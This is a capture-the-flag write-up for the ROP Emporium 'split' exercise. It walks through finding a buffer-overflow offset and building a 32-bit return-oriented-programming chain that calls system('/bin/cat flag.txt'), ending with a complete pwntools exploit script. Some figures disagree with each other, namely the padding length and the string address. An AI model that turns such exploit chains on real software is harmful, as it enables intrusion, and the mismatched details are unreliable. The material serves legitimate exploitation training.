# split

Link: https://ropemporium.com/challenge/split.html

--------------------------

First we check if the offset is different than in the previous challenge, "ret2win". It seems it is still 40, with 41 characters we see only one "41" in RIP registry:

![a](images/Screenshot_1.jpg)

We can find the system address with objdump, located in "0x08048430" (the address of system in the .plt section):

![a](images/Screenshot_3.jpg)

Next, we need the address of the string "/bin/cat flag.txt". We can do this using GEF, and finding the address is "0x601060":

```
gdb -q ./split32
break main
r
grep "/bin/cat flag.txt"
``` 

![a](images/Screenshot_4.jpg)

We can find the address of this string with ROPgadget too:

![a](images/Screenshot_5.jpg)


The idea is concatenating the addresses (system) + (exit) + (command), just like in [here](https://bufferoverflows.net/rop-manual-exploitation-on-x32-linux/)

The problem is that there is not an exit function, so we will look for the instruction *leave*, I will take 0x080484e8:

![a](images/Screenshot_2.jpg)

So now we have the addresses of "system" in .plt section, an instruction for "exiting" and the string with the command. Concatenating it makes the exploit work:

![a](images/Screenshot_6.jpg)

Now we will change the calculation of some addresses and make it automatically with Python:

```
system  = elf.sym["system"] #system  = 0x08048430 
command = next(elf.search('/bin/cat flag.txt')) #command = 0x0804a030 
exit =    0x080484e8
junk = "A"*44
rop = junk + p32(system) + p32(exit) + p32(command)
```

And it still works! Final exploit:

```
from pwn import *

context(arch='i386', os='linux')
binary_name = 'split32'

p = process('./'+binary_name)
elf =  ELF(binary_name)

system  = elf.sym["system"] #system  = 0x08048430 
command = next(elf.search('/bin/cat flag.txt')) #command = 0x0804a030 
exit =    0x080484e8
log.info("system %s"  % hex(system))
log.info("command %s" % hex(command))

junk = "A"*44
rop = junk + p32(system) + p32(exit) + p32(command)
p.recvuntil("> ")
p.send(rop)
p.interactive()
```

---------------------------------

Similar ROPs: 

- https://bufferoverflows.net/rop-manual-exploitation-on-x32-linux/
